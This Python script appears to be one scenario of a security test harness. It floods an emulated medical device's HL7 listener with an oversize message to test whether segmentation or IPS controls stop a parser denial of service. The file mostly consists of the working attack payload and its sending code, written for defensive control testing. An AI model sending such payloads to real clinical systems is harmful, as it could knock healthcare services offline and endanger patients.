#!/usr/bin/env python3
"""
Scenario 04 — Protocol parser DoS via oversize HL7 message (Denial of Service, D category).

Sends a deliberately-oversize HL7 message that triggers the emulator's protocol-parser
fault path, simulating URGENT/11-class input-handling vulnerabilities.

Compensating controls expected to mitigate:
  - Network segmentation: attacker traffic doesn't reach target
  - IPS virtual patching: signature for oversize HL7 message blocks before reaching target
  - Rate limiting: not modelled in this basic harness
"""

import os
import socket
import time

STRIDE_HC = "D"
SCENARIO_NAME = "04-dos-protocol-flood"

TARGET_HOST = os.environ.get("TARGET_HOST", "172.28.10.20")
HL7_PORT = int(os.environ.get("TARGET_HL7_PORT", "2575"))


def is_target_alive() -> bool:
    """Probe management /status endpoint, which is unauthenticated."""
    try:
        with socket.create_connection((TARGET_HOST, 8080), timeout=2) as s:
            s.sendall(b"GET /status HTTP/1.0\r\n\r\n")
            data = s.recv(4096)
            return b"running" in data
    except (OSError, socket.timeout):
        return False


def attempt_oversize_message() -> str:
    """Returns 'sent', 'blocked', or 'error'."""
    payload = b"\x0bMSH|^~\\&|" + (b"X" * (40 * 1024)) + b"\x1c\x0d"
    try:
        with socket.create_connection((TARGET_HOST, HL7_PORT), timeout=5) as s:
            s.sendall(payload)
            try:
                _ = s.recv(1024)
            except socket.timeout:
                pass
        return "sent"
    except (ConnectionRefusedError, OSError) as e:
        return f"blocked:{e}"


def run() -> dict:
    print(f"[04] Probing target liveness before attack")
    pre_alive = is_target_alive()
    if not pre_alive:
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "BLOCKED",
            "detail": "Target unreachable before attack — segmentation in effect",
        }

    print(f"[04] Sending oversize HL7 message")
    send_result = attempt_oversize_message()

    print(f"[04] Waiting 4 seconds for emulator recovery window")
    time.sleep(4)

    post_alive = is_target_alive()

    if send_result.startswith("blocked"):
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "BLOCKED",
            "detail": f"HL7 send blocked at network layer: {send_result}",
        }

    if post_alive and send_result == "sent":
        # Target survived (control may have rate-limited or filtered)
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "MITIGATED",
            "detail": "Oversize message reached target but availability preserved",
        }

    return {
        "scenario": SCENARIO_NAME,
        "stride_hc": STRIDE_HC,
        "outcome": "SUCCESS",
        "detail": "Target HL7 listener unreachable post-attack (DoS achieved)",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(run(), indent=2))
